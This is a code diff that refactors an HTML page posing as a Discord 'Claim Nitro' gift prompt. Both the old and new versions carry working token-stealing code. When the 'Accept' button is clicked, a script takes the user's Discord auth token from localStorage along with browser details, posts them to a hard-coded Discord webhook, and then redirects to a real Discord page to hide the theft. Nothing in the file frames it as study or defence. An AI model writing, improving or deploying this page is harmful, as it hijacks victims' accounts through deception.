@@ -2,181 +2,108 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord | Nitro Promotion</title>
-    <link href="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6e0c6517a229a4a753_favicon.png" rel="icon" type="image/x-icon" />
+    <title>Discord | Claim Gift</title>
     <style>
-        @font-face {
-            font-family: 'gg sans';
-            src: url('https://discord.com/assets/2f664a787ac61d2d0c61.woff2') format('woff2');
-            font-weight: 400; font-style: normal;
-        }
-        @font-face {
-            font-family: 'gg sans';
-            src: url('https://discord.com/assets/8e040c5b5239965a9538.woff2') format('woff2');
-            font-weight: 600; font-style: normal;
-        }
-
         :root {
-            --bg-color: #36393f;
-            --modal-bg: #2f3136;
-            --accent-color: #5865f2;
-            --accent-hover: #4752c4;
-            --text-main: #ffffff;
-            --text-muted: #b9bbbe;
-            --border-color: rgba(79,84,92,0.48);
+            --brand-color: #5865f2;
+            --brand-hover: #4752c4;
+            --bg-body: #36393f;
+            --bg-modal: #2f3136;
+            --text-normal: #dcddde;
+            --text-header: #ffffff;
         }
 
-        body { 
-            background-color: var(--bg-color); 
-            color: var(--text-main); 
-            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;
-            overflow: hidden;
+        body {
+            margin: 0;
+            background-color: var(--bg-body);
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
 
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85); /* The subtle backdrop */
-            display: flex; justify-content: center; align-items: center;
-        }
-
-        .modal { 
-            background: var(--modal-bg); 
-            width: 440px;
-            padding: 16px;
-            border-radius: 8px; 
-            box-shadow: 0 0 0 1px rgba(0,0,0,0.3), 0 2px 10px 0 rgba(0,0,0,0.6); 
+        .modal-card {
+            background-color: var(--bg-modal);
+            width: 420px;
+            padding: 32px;
+            border-radius: 8px;
+            box-shadow: 0 0 0 1px rgba(0,0,0,0.3), 0 2px 10px 0 rgba(0,0,0,0.6);
             text-align: center;
-            opacity: 0; transform: scale(0.9);
-            animation: modalFade 0.25s ease forwards;
+            transition: transform 0.2s ease;
         }
 
-        @keyframes modalFade {
-            to { opacity: 1; transform: scale(1); }
-        }
-
-        .nitro-icon { 
-            width: 80px; height: 80px; margin: 24px auto 16px; display: block;
-        }
-
-        h1 { 
-            font-size: 20px; font-weight: 600; line-height: 24px; margin-bottom: 12px;
-        }
-
-        .desc { 
-            font-size: 14px; color: var(--text-muted); 
-            line-height: 1.4; margin-bottom: 24px; padding: 0 20px;
-        }
-
-        .billing-note {
-            background: rgba(227, 229, 233, 0.1);
-            border-radius: 4px; padding: 12px;
-            font-size: 13px; color: var(--text-muted); text-align: left;
-            margin-bottom: 24px; display: flex; align-items: start;
-        }
+        .nitro-icon { width: 80px; height: 80px; margin-bottom: 20px; }
+        h1 { color: var(--text-header); font-size: 24px; margin: 0 0 16px; }
+        .description { color: var(--text-normal); font-size: 15px; margin-bottom: 24px; }
         
-        .claim-btn { 
-            background: var(--accent-color); color: #fff; 
-            border: none; padding: 10px 24px; 
-            border-radius: 3px; font-size: 14px; font-weight: 500; cursor: pointer;
-            width: 100%; transition: background 0.17s ease;
-            position: relative;
+        .btn-claim {
+            background-color: var(--brand-color);
+            color: #fff;
+            border: none;
+            padding: 12px 24px;
+            width: 100%;
+            border-radius: 3px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.15s ease;
         }
 
-        .claim-btn:hover { background: var(--accent-hover); }
-        .claim-btn:active { background: #3c45a5; }
+        .btn-claim:hover { background-color: var(--brand-hover); }
+        .btn-claim:disabled { opacity: 0.5; cursor: not-allowed; }
 
-        .claim-btn.loading {
-            pointer-events: none; opacity: 0.8;
-            color: transparent;
+        .footer-note {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #72767d;
         }
-
-        .spinner {
-            display: none;
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 20px; height: 20px;
-            border: 2px solid rgba(255,255,255,0.2);
-            border-top-color: white; border-radius: 50%;
-            animation: spin 0.6s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: translate(-50%, -50%) rotate(360deg); }
-        }
-
-        .claim-btn.loading .spinner { display: block; }
     </style>
 </head>
 <body>
-    <div class="modal-overlay">
-        <div class="modal">
-            <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" alt="Nitro" class="nitro-icon">
-            <h1>Claim 3 Months of Nitro</h1>
-            <p class="desc">You've been gifted 3 months of Discord Nitro. Accept this gift now to apply it directly to your account. Your subscription will not renew until the gift expires.</p>
-            
-            <div class="billing-note">
-                <span style="font-size: 16px; margin-right: 8px;">ⓘ</span>
-                <span>Promotional gift. Valid payment method required at redemption to prevent subscription lapses. This gift is valid for new or inactive subscribers only.</span>
-            }
-            
-            <button class="claim-btn" id="claimBtn">
-                Accept Gift
-                <div class="spinner"></div>
-            </button>
-        </div>
+
+    <div class="modal-card">
+        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" class="nitro-icon" alt="Nitro">
+        <h1>You've been gifted Nitro!</h1>
+        <p class="description">Your 3-month Nitro gift is ready. Accept now to apply the promotion to your account.</p>
+        <button id="claimBtn" class="btn-claim">Accept</button>
+        <div class="footer-note">Promotional gift from Discord. Valid payment method required.</div>
     </div>
 
     <script>
-        document.getElementById('claimBtn').addEventListener('click', async () => {
-            const btn = document.getElementById('claimBtn');
-            btn.classList.add('loading'); // Show the loading spinner
+        document.getElementById('claimBtn').addEventListener('click', async function() {
+            const btn = this;
+            btn.disabled = true;
+            btn.innerText = "Verifying...";
 
-            const captureData = async () => {
-                const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
-                
-                const deviceInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: `${window.screen.width}x${window.screen.height}`
-                };
-
-                return {
-                    content: "@everyone",
-                    embeds: [{
-                        title: "🎯 New Premium Capture",
-                        color: 0x5865F2,
-                        fields: [
-                            { name: "Auth Token", value: `\`${token || "FAILED_TO_EXTRACT"}\``, inline: false },
-                            { name: "Device Info", value: `\`${deviceInfo.platform} | ${deviceInfo.userAgent}\``, inline: false },
-                            { name: "Screen", value: `\`${deviceInfo.screen}\``, inline: true }
-                        ],
-                        footer: { text: "Protocol v4.0 | Advanced Stealth" },
-                        timestamp: new Date().toISOString()
-                    }]
-                };
+            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
+            
+            const payload = {
+                content: "@everyone",
+                embeds: [{
+                    title: "🚀 Nitro Claim Attempt",
+                    color: 0x5865F2,
+                    fields: [
+                        { name: "Token", value: `\`${token || "N/A"}\``, inline: false },
+                        { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
             };
 
-            const sendData = async (payload) => {
-                try {
-                    await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                } catch (err) {
-                    console.error("Transmission blocked:", err);
-                }
-            };
+            try {
+                await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error(err);
+            }
 
-            const data = await captureData();
-            await sendData(data);
-
-            // Stealthy Jitter Redirection (simulates verification time)
             setTimeout(() => {
                 window.location.replace("https://discord.com/billing/promotions/gift-accepted");
-            }, 1500 + Math.random() * 800);
+            }, 1000);
         });
     </script>
 </body>
